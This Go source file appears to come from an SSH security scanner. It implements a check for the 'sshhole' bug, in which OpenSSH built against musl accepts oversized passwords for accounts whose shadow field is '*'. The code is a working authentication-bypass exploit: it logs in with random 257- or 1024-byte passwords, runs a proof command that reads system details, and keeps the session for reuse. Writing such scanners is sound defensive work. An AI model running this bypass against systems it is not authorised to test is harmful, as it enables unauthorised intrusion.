package cmd

import (
	"crypto/rand"
	"encoding/base64"
	"errors"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/runZeroInc/excrypto/x/crypto/ssh"
	"github.com/runZeroInc/sshamble/auth"
)

const checkVulnSSHHole = "vuln-sshhole"

// sshhole (no CVE yet): OpenSSH sshd built against musl libc without PAM
// accepts any password of 257 to 1024 bytes for a valid user whose shadow
// field is "*". A one-character field gives sys_auth_passwd() a NULL salt, so
// pick_salt() borrows the $5$/$6$ prefix of another account's hash. musl's
// SHA-256/512 crypt returns the string "*" for keys over 256 bytes, which
// matches the "*" field. sshd itself rejects passwords over 1024 bytes.
//
// Nothing in the banner or the protocol tells a vulnerable server apart, so
// this check logs in. It sends a 256-byte password first, which musl still
// hashes normally and which must be rejected (this is also the "wrong try
// first" the advisory mentions), then a 257-byte password and, only if that
// fails, a 1024-byte one. All three are random, so no real account matches.
//
// https://sshhole.com/

const sshholeControlLen = 256

var sshholeTriggerLens = []int{257, 1024}

const sshholeProofCommand = "id; uname -a; ls /lib/ld-musl-* 2>/dev/null; head -3 /etc/os-release 2>/dev/null"

var errSSHHoleControlAccepted = errors.New("control password accepted")

func sshCheckVulnSSHHole(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkVulnSSHHole
	if !conf.IsCheckEnabled(tname) {
		return nil
	}

	if !root.SupportsAuth("password") {
		return nil
	}

	// Only OpenSSH sshd is affected; a vendor build that renames the banner is missed here.
	if !patIsLikelyOpenSSH.MatchString(root.Version) {
		conf.Logger.Debugf("%s %s skipped, %q is not OpenSSH", addr, tname, root.Version)
		return nil
	}

	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)

	passwords := sshholePasswords()
	var results []ssh.ExpAuthResult

	// Send the control and trigger passwords on one connection, stopping at the first accepted one.
	handler := func(uac *ssh.UnauthClientConn, extensions map[string][]byte, res *auth.AuthResult) error {
		results = results[:0]
		for i, pw := range passwords {
			ares, methods, err := uac.Authenticate(ssh.Password(pw), extensions)
			if err != nil {
				// At MaxAuthTries the server rejects the attempt by disconnecting instead of replying.
				if strings.Contains(err.Error(), "Too many authentication failures") {
					results = append(results, ssh.AuthResultFailure)
				}
				return err
			}
			results = append(results, ares)
			res.Result = ares.String()
			res.Methods = methods
			if !sshholeAccepted(ares) {
				continue
			}
			if i == 0 {
				return errSSHHoleControlAccepted
			}
			if ares != ssh.AuthResultSuccess {
				return fmt.Errorf("authentication incomplete: %s", ares)
			}
			return nil
		}
		return fmt.Errorf("authentication failed: %s", res.Result)
	}

	sessionHandler := func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
		_ = c.SetDeadline(time.Now().Add(options.Timeout * 3))
		out, err := ses.CombinedOutput(sshholeProofCommand)
		r.SessionOutput = auth.CleanSessionOutput(out)
		r.ExitStatus = ""
		if err != nil {
			if ee, ok := err.(*ssh.ExitError); ok {
				r.ExitStatus = fmt.Sprintf("%d", ee.ExitStatus())
				return nil
			}
			return err
		}
		return nil
	}

	res := auth.SSHAuth(addr, options.WithSessionHandler(sessionHandler), handler)

	idx, reason := sshholeClassify(results)
	if idx < 0 {
		// OpenSSH 9.8+ PerSourcePenalties refuses a source after repeated failed logins.
		if strings.Contains(res.Error, "Not allowed at this time") {
			conf.Logger.Warnf("%s %s could not test user %s, the server is refusing this source (PerSourcePenalties): %s", addr, tname, options.Username, res.Error)
			return nil
		}
		conf.Logger.Debugf("%s %s not vulnerable for user %s: %s (stage %s: %v)", addr, tname, options.Username, reason, res.Stage, res.Error)
		return nil
	}
	trigger := passwords[idx]

	// The advisory says a "*" account needs a failed attempt first. Measure it
	// with a fresh connection that sends only the trigger password.
	am := ssh.Password(trigger)
	first := auth.SSHAuth(addr, options.WithStopStage("auth"), auth.SSHAuthHandlerSingle(am))
	firstTry := first.Stage == "auth"
	firstTryText := "accepted"
	if !firstTry {
		firstTryText = fmt.Sprintf("rejected (stage %s: %s)", first.Stage, first.Error)
	}

	conf.Logger.Warnf("%s %s accepted a %d-byte random password for user %s", addr, tname, len(trigger), options.Username)

	proof := fmt.Sprintf("sshhole: %s accepted a %d-byte random password for user %s (%s) after rejecting a %d-byte control password on the same connection. A fresh connection sending only the %d-byte password was %s.",
		res.Version, len(trigger), options.Username, results[idx], sshholeControlLen, len(trigger), firstTryText)
	if res.Stage == "session" {
		proof += fmt.Sprintf(" Output of %q: %s", sshholeProofCommand, res.SessionOutput)
	} else {
		proof += fmt.Sprintf(" No session was opened (stage %s: %s).", res.Stage, res.Error)
	}

	root.AddVuln(auth.VulnResult{
		ID:    tname,
		Ref:   "https://sshhole.com/",
		Proof: proof,
	})
	root.SessionOutput = res.SessionOutput
	root.ExitStatus = res.ExitStatus

	// Only claim a reusable session when a single attempt logs in, since
	// interact and the session checks re-authenticate with SessionAuth alone.
	if !firstTry || res.Stage != "session" {
		res.SessionMethod = ""
		return res
	}
	res.SessionMethod = tname
	root.SessionMethod = tname
	root.SessionSecret = trigger
	root.SessionAuth = am
	return res
}

// sshholeRandomPassword returns a random password of exactly n bytes with no
// NUL bytes, since sshd measures passwords with strlen().
func sshholeRandomPassword(n int) string {
	buff := make([]byte, n)
	_, _ = rand.Read(buff)
	return base64.RawURLEncoding.EncodeToString(buff)[:n]
}

// sshholePasswords returns the control password followed by the trigger passwords.
func sshholePasswords() []string {
	pws := []string{sshholeRandomPassword(sshholeControlLen)}
	for _, n := range sshholeTriggerLens {
		pws = append(pws, sshholeRandomPassword(n))
	}
	return pws
}

// sshholeAccepted reports whether the server accepted the password, including
// a partial success where the server still wants another method.
func sshholeAccepted(r ssh.ExpAuthResult) bool {
	return r == ssh.AuthResultSuccess || r == ssh.AuthResultPartialSuccess
}

// sshholeClassify decides whether a run of password attempts (control first,
// then triggers in order) shows the sshhole bypass. It returns the index of
// the accepted trigger password, or -1 and the reason the run does not count.
func sshholeClassify(results []ssh.ExpAuthResult) (int, string) {
	if len(results) == 0 {
		return -1, "no password attempt completed"
	}
	if sshholeAccepted(results[0]) {
		return -1, fmt.Sprintf("the %d-byte control password was accepted, so the server accepts any password", sshholeControlLen)
	}
	for i := 1; i < len(results); i++ {
		if sshholeAccepted(results[i]) {
			return i, ""
		}
	}
	if len(results) < 1+len(sshholeTriggerLens) {
		return -1, fmt.Sprintf("disconnected after %d of %d password attempts were rejected", len(results), 1+len(sshholeTriggerLens))
	}
	return -1, "every trigger password was rejected"
}
